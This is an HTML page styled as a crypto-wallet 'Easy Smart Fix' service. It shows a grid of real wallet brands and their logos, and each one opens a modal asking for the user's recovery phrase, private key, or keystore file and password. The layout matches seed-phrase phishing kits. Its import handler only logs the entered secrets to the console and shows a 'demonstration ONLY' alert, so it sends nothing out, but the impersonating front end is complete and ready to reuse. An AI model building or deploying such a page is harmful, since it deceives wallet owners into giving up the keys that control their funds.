<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect & Import</title>
    <style>
        /* Basic Reset & Body Styling */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Align to top initially */
            min-height: 100vh;
            padding-top: 20px; /* Add some space from the top */
            box-sizing: border-box;
        }

        /* Main Container */
        .container {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 25px;
            max-width: 900px;
            width: 100%;
            text-align: center;
            box-sizing: border-box;
            margin: 20px; /* Margin for smaller screens */
        }

        h1 {
            font-size: 2.2em;
            color: #2c3e50;
            margin-bottom: 10px;
        }

        p.subtitle {
            font-size: 1.1em;
            color: #555;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        /* Wallet Grid */
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); /* Responsive grid */
            gap: 20px;
            justify-items: center;
            margin-top: 30px;
        }

        .wallet-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 15px 10px;
            border-radius: 10px;
            background-color: #fff;
            transition: all 0.2s ease-in-out;
            cursor: pointer;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            border: 1px solid #eee;
        }

        .wallet-item:hover {
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            transform: translateY(-3px);
            border-color: #007bff;
        }

        .wallet-item img {
            width: 50px;
            height: 50px;
            object-fit: contain;
            margin-bottom: 10px;
            border-radius: 8px; /* Slightly rounded for icons */
        }

        .wallet-item p {
            margin: 0;
            font-size: 0.9em;
            font-weight: 500;
            color: #444;
        }

        /* Modal Styling */
        .modal-overlay {
            display: none; /* Hidden by default */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.3s ease-in-out;
        }

        .modal-overlay.active {
            display: flex;
            opacity: 1;
        }

        .modal-content {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 500px;
            position: relative;
            transform: translateY(-20px); /* Initial slight offset */
            transition: transform 0.3s ease-in-out;
        }

        .modal-overlay.active .modal-content {
            transform: translateY(0);
        }

        .modal-header {
            display: flex;
            justify-content: space-around;
            border-bottom: 1px solid #eee;
            padding: 0;
            background-color: #f8f9fa;
            border-top-left-radius: 12px;
            border-top-right-radius: 12px;
        }

        .modal-tab {
            flex: 1;
            padding: 15px 0;
            cursor: pointer;
            font-weight: 600;
            color: #6c757d;
            transition: all 0.2s ease-in-out;
            text-align: center;
            border-bottom: 3px solid transparent; /* For active indicator */
        }

        .modal-tab.active {
            color: #007bff;
            border-color: #007bff;
            background-color: #fff;
        }

        .modal-body {
            padding: 25px;
        }

        .tab-content {
            display: none; /* Hidden by default */
        }

        .tab-content.active {
            display: block;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #343a40;
            font-size: 0.95em;
        }

        .form-group textarea,
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ced4da;
            border-radius: 8px;
            font-size: 1em;
            box-sizing: border-box;
            transition: border-color 0.2s ease-in-out;
        }

        .form-group textarea:focus,
        .form-group input:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }

        .form-group textarea {
            min-height: 100px;
            resize: vertical;
        }

        .import-button {
            width: 100%;
            padding: 12px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease-in-out, transform 0.1s ease-in-out;
        }

        .import-button:hover {
            background-color: #0056b3;
            transform: translateY(-1px);
        }

        .import-button:active {
            transform: translateY(0);
        }

        .close-button {
            position: absolute;
            top: 10px;
            right: 15px;
            background: none;
            border: none;
            font-size: 1.8em;
            color: #6c757d;
            cursor: pointer;
            line-height: 1;
            padding: 5px;
            transition: color 0.2s ease-in-out;
        }

        .close-button:hover {
            color: #333;
        }

        /* Responsive Adjustments */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
                margin: 10px;
            }
            h1 {
                font-size: 1.8em;
            }
            p.subtitle {
                font-size: 1em;
            }
            .wallet-grid {
                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
                gap: 15px;
            }
            .wallet-item {
                padding: 10px 5px;
            }
            .wallet-item img {
                width: 45px;
                height: 45px;
            }
            .wallet-item p {
                font-size: 0.8em;
            }
            .modal-content {
                width: 95%;
                margin: 10px;
            }
            .modal-body {
                padding: 20px;
            }
            .modal-tab {
                padding: 12px 0;
                font-size: 0.9em;
            }
            .form-group label {
                font-size: 0.9em;
            }
            .form-group textarea,
            .form-group input {
                padding: 10px;
                font-size: 0.9em;
            }
            .import-button {
                padding: 10px 15px;
                font-size: 1em;
            }
        }

        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
                gap: 10px;
            }
            .wallet-item img {
                width: 40px;
                height: 40px;
            }
            .wallet-item p {
                font-size: 0.75em;
            }
            .close-button {
                font-size: 1.5em;
                top: 8px;
                right: 10px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Easy Smart Fix for Every Wallet</h1>
        <p class="subtitle">Select your preferable wallet and get connected to create a safe and secure web extension.</p>

        <div class="wallet-grid" id="walletGrid">
            <!-- Wallet items will be dynamically loaded here by JavaScript -->
        </div>
    </div>

    <!-- Wallet Import Modal -->
    <div class="modal-overlay" id="walletImportModal">
        <div class="modal-content">
            <button class="close-button" id="closeModalBtn">&times;</button>
            <div class="modal-header">
                <div class="modal-tab active" data-tab="phrase">Phrase</div>
                <div class="modal-tab" data-tab="private-key">Private Key</div>
                <div class="modal-tab" data-tab="keystore">Keystore</div>
            </div>
            <div class="modal-body">
                <!-- Phrase Tab Content -->
                <div class="tab-content active" id="phraseTabContent">
                    <div class="form-group">
                        <label for="recoveryPhrase">Enter Phrase</label>
                        <textarea id="recoveryPhrase" placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)"></textarea>
                    </div>
                    <button class="import-button" data-type="phrase">Import Wallet</button>
                </div>

                <!-- Private Key Tab Content -->
                <div class="tab-content" id="privateKeyTabContent">
                    <div class="form-group">
                        <label for="privateKey">Enter Private Key</label>
                        <input type="text" id="privateKey" placeholder="Enter your private key">
                    </div>
                    <button class="import-button" data-type="private-key">Import Wallet</button>
                </div>

                <!-- Keystore Tab Content -->
                <div class="tab-content" id="keystoreTabContent">
                    <div class="form-group">
                        <label for="keystoreJson">Keystore JSON</label>
                        <textarea id="keystoreJson" placeholder="Input your Keystore JSON"></textarea>
                    </div>
                    <div class="form-group">
                        <label for="keystorePassword">Password</label>
                        <input type="password" id="keystorePassword" placeholder="Enter Keystore password">
                    </div>
                    <button class="import-button" data-type="keystore">Import Wallet</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Array of wallet data (name and a placeholder icon URL)
        // In a real application, you would use actual icon URLs.
        const wallets = [
            { name: "Trust Wallet", icon: "https://trustwallet.com/_next/image?url=https%3A%2F%2Fstrapi-cdn.trustwallet.com%2FTrust_Wallet_Shield_fe03d09499.png&w=3840&q=75" },
            { name: "Sui Wallet", icon: "https://sui.io/favicon.svg" },
            { name: "OKX Wallet", icon: "https://www.okx.com/cdn/assets/imgs/221/92A09325608B077A.png" },
            { name: "Sonar", icon: "https://assets.website-files.com/618c7c2551e18d098e945c71/61902047875b141445b23d04_Sonar_Logo_Icon_White_Background.png" },
            { name: "Keplr", icon: "https://www.keplr.app/logo.svg" },
            { name: "Leap Wallet", icon: "https://leapwallet.io/logo.svg" },
            { name: "STEPN", icon: "https://www.stepn.com/favicon.ico" },
            { name: "Unisat", icon: "https://unisat.io/favicon.ico" },
            { name: "Hotwallet", icon: "https://hotwallet.io/favicon.ico" },
            { name: "Stake Cube Wallet", icon: "https://stakecube.net/favicon.ico" },
            { name: "Metamask", icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
            { name: "Solfare", icon: "https://solfare.com/favicon.ico" },
            { name: "Wallet Connect", icon: "https://walletconnect.com/meta/favicon.ico" },
            { name: "Uniswap", icon: "https://uniswap.org/favicon.ico" },
            { name: "Phantom", icon: "https://phantom.app/img/phantom-icon.png" },
            { name: "Coinomi", icon: "https://www.coinomi.com/assets/img/favicon/apple-touch-icon.png" },
            { name: "Coinbase", icon: "https://www.coinbase.com/favicon.ico" },
            { name: "Gnosis Safe Multisig", icon: "https://safe.global/images/safe-logo.svg" },
            { name: "Xverse Wallet", icon: "https://www.xverse.app/favicon.ico" },
            { name: "MagicEden", icon: "https://magiceden.io/favicon.ico" },
            { name: "HaloDefi Wallet", icon: "https://halodefi.io/favicon.ico" },
            { name: "Argent", icon: "https://www.argent.xyz/favicon.ico" },
            { name: "Atomic", icon: "https://atomicwallet.io/favicon.ico" },
            { name: "Rainbow", icon: "https://rainbow.me/favicon.ico" }
        ];

        const walletGrid = document.getElementById('walletGrid');
        const walletImportModal = document.getElementById('walletImportModal');
        const closeModalBtn = document.getElementById('closeModalBtn');
        const modalTabs = document.querySelectorAll('.modal-tab');
        const tabContents = document.querySelectorAll('.tab-content');
        const importButtons = document.querySelectorAll('.import-button');

        // Function to render wallet items
        function renderWallets() {
            walletGrid.innerHTML = ''; // Clear existing content
            wallets.forEach(wallet => {
                const walletItem = document.createElement('div');
                walletItem.classList.add('wallet-item');
                walletItem.innerHTML = `
                    <img src="${wallet.icon}" alt="${wallet.name} Icon">
                    <p>${wallet.name}</p>
                `;
                walletItem.addEventListener('click', () => openModal(wallet.name));
                walletGrid.appendChild(walletItem);
            });
        }

        // Function to open the modal
        function openModal(walletName) {
            walletImportModal.classList.add('active');
            // You can dynamically update modal title here if needed, e.g.,
            // document.getElementById('modalTitle').textContent = Import ${walletName} Wallet;
        }

        // Function to close the modal
        function closeModal() {
            walletImportModal.classList.remove('active');
            // Clear all input fields when closing the modal for security/fresh state
            document.getElementById('recoveryPhrase').value = '';
            document.getElementById('privateKey').value = '';
            document.getElementById('keystoreJson').value = '';
            document.getElementById('keystorePassword').value = '';
        }

        // Event listener for closing the modal
        closeModalBtn.addEventListener('click', closeModal);
        walletImportModal.addEventListener('click', (e) => {
            if (e.target === walletImportModal) { // Close if clicked on overlay
                closeModal();
            }
        });

        // Function to switch tabs
        modalTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                // Deactivate all tabs and content
                modalTabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(tc => tc.classList.remove('active'));

                // Activate clicked tab and its content
                tab.classList.add('active');
                const targetTab = tab.dataset.tab;
                document.getElementById(`${targetTab}TabContent`).classList.add('active');
            });
        });

        // Event listener for Import Wallet buttons (for demonstration)
        importButtons.forEach(button => {
            button.addEventListener('click', () => {
                const importType = button.dataset.type;
                let data = {};

                switch (importType) {
                    case 'phrase':
                        data.phrase = document.getElementById('recoveryPhrase').value;
                        break;
                    case 'private-key':
                        data.privateKey = document.getElementById('privateKey').value;
                        break;
                    case 'keystore':
                        data.keystoreJson = document.getElementById('keystoreJson').value;
                        data.keystorePassword = document.getElementById('keystorePassword').value;
                        break;
                }

                console.log(`Attempting to import wallet via ${importType}:`, data);
                alert("Import attempt logged to console. Remember this is for demonstration ONLY. Do NOT enter real credentials on untrusted sites!");
                closeModal(); // Optionally close modal after "import" attempt
            });
        });

        // Initial render of wallets when the page loads
        document.addEventListener('DOMContentLoaded', renderWallets);
    </script>

</body>
</html>
